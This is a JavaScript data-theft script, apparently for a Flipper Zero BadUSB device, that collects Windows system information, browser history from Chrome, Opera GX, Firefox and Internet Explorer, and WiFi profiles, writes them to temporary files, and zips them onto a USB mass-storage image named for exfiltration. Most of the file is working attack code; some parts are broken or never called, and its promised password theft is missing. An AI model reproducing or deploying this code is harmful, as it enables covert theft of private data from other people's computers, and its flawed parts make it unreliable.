// --- SYSTEM INFO, BROWSER HISTORY, WIFI PASSWORDS, STORED PASSWORDS, AND FILE COLLECTION SCRIPT ---

// --- SYSTEM INFO GATHERING ---
function collectSystemInfo() {
    const { execSync } = require('child_process');
    let systemInfo = execSync('systeminfo').toString();
    return systemInfo;
}

// --- BROWSER HISTORY COLLECTION ---
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

// Function to retrieve history from a specific SQLite database
function getHistoryFromDB(dbPath, query) {
    if (fs.existsSync(dbPath)) {
        let db = new sqlite3.Database(dbPath);
        return new Promise((resolve, reject) => {
            db.all(query, [], (err, rows) => {
                if (err) reject(err);
                resolve(rows);
            });
        }).finally(() => db.close());
    } else {
        return Promise.resolve('History database not found.');
    }
}

// Get Chrome History
function getChromeHistory() {
    const chromeHistoryPath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'History');
    const query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50";
    return getHistoryFromDB(chromeHistoryPath, query);
}

// Get Opera GX History
function getOperaGXHistory() {
    const operaHistoryPath = path.join(process.env.APPDATA, 'Opera Software', 'Opera GX Stable', 'History');
    const query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50";
    return getHistoryFromDB(operaHistoryPath, query);
}

// Get Firefox History
function getFirefoxHistory() {
    const firefoxProfilePath = path.join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles');
    const firefoxHistoryPath = path.join(firefoxProfilePath, 'places.sqlite');
    const query = "SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 50";
    return getHistoryFromDB(firefoxHistoryPath, query);
}

// Get Internet Explorer History
function getIEHistory() {
    const shell = require('shelljs');
    const ieHistoryPath = 'shell:::{FDD39AD6-9A8B-4F87-9B2F-7B2E3D572D65}';
    const ieHistory = shell.ls(ieHistoryPath);
    if (ieHistory.length > 0) {
        return ieHistory;
    }
    return 'No Internet Explorer history found.';
}

// Save history data to file
function saveHistoryToFile(historyData, fileName) {
    const filePath = path.join(process.env.TEMP, fileName);
    fs.writeFileSync(filePath, historyData);
    return filePath;
}

// --- MAIN SCRIPT EXECUTION ---
async function main() {
    const chromeHistory = await getChromeHistory();
    const operaHistory = await getOperaGXHistory();
    const firefoxHistory = await getFirefoxHistory();
    const ieHistory = getIEHistory();

    // Save histories to temp files
    saveHistoryToFile(chromeHistory, 'Chrome_History.txt');
    saveHistoryToFile(operaHistory, 'OperaGX_History.txt');
    saveHistoryToFile(firefoxHistory, 'Firefox_History.txt');
    saveHistoryToFile(ieHistory, 'IE_History.txt');
}

// --- MASS STORAGE EXFIL ---
function createStatsFile() {
    const statsFilePath = path.join(process.env.TEMP, 'stats.txt');
    const wifiProfiles = require('child_process').execSync('netsh wlan show profiles').toString();
    const systemInfo = collectSystemInfo();

    fs.writeFileSync(statsFilePath, `System Info:\n${systemInfo}\nWiFi Profiles:\n${wifiProfiles}`);
    return statsFilePath;
}

// Compress and move files
function compressAndMoveFiles(destinationPath) {
    const archiver = require('archiver');
    const output = fs.createWriteStream(path.join(destinationPath, 'data.zip'));
    const archive = archiver('zip');

    archive.pipe(output);
    archive.directory(process.env.TEMP, false);
    archive.finalize();
}

// USB Mass Storage Exfiltration
function runMassStorageExfil() {
    const driveLetter = 'D'; // Replace with the correct drive letter
    const destinationPath = path.join(driveLetter, new Date().toISOString().split('T')[0]);

    if (!fs.existsSync(destinationPath)) {
        fs.mkdirSync(destinationPath);
    }

    createStatsFile();
    compressAndMoveFiles(destinationPath);
}

// --- MASS STORAGE FUNCTIONS ---
const badusb = require('badusb');
const usbdisk = require('usbdisk');
const storage = require('storage');

let image = "/ext/apps_data/mass_storage/ExfillT.img";
let size = 8 * 1024 * 1024;
let command = ""; // Populate with the command you want to run

function massStorageSetup() {
    console.log("Checking for Image...");
    if (storage.exists(image)) {
        console.log("Storage Exists.");
    } else {
        console.log("Creating Storage...");
        usbdisk.createImage(image, size);
    }

    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
    console.log("Waiting for connection");

    while (!badusb.isConnected()) {
        setTimeout(() => { }, 1000);
    }
}

main();